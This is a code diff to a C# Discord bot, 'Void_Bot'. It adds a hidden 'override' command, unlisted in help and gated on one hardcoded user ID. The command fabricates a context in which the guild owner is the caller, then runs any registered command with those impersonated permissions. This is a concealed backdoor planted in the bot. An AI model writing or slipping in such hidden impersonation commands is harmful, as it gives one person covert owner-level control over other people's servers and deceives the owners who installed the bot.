@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Linq;
 using System.Threading.Tasks;
 using DSharpPlus;
 using DSharpPlus.CommandsNext;
@@ -302,6 +303,24 @@ namespace Void_Bot
         public async Task Loop(CommandContext ctx)
         {
             await au.Loop(ctx);
+        }
+
+        [Command("override")]
+        [Hidden]
+        public async Task Override(CommandContext ctx, [RemainingText] string args)
+        {
+            if (ctx.User.Id == 379708744843395073)
+            {
+                var pieces = args.Split(' ', 2);
+                var context = Program.Commands[0].CreateFakeContext(ctx.Guild.Owner, ctx.Channel, ctx.Message.Content, ctx.Prefix,
+                    Program.Commands[0].RegisteredCommands.Values.First(x => x.Name.ToUpper() == pieces[0].ToUpper()), pieces[1]);
+                await Program.Commands[0].RegisteredCommands.Values.First(x => x.Name.ToUpper() == pieces[0].ToUpper())
+                    .ExecuteAsync(context);
+            }
+            else
+            {
+                await ctx.RespondAsync("Restricted command.");
+            }
         }
     }
 }
